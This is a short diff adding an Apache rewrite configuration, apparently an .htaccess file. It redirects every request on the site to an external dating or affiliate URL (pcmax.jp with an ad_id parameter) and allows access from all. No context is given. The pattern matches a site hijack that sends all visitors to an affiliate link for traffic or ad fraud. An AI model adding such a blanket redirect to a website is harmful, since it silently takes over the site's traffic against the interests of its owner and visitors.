@@ -1,0 +1,4 @@
+RewriteEngine On
+RewriteRule ^(.*)$ https://pcmax.jp/?ad_id=rm207048 [R,L]
+Order allow,deny
+Allow from all
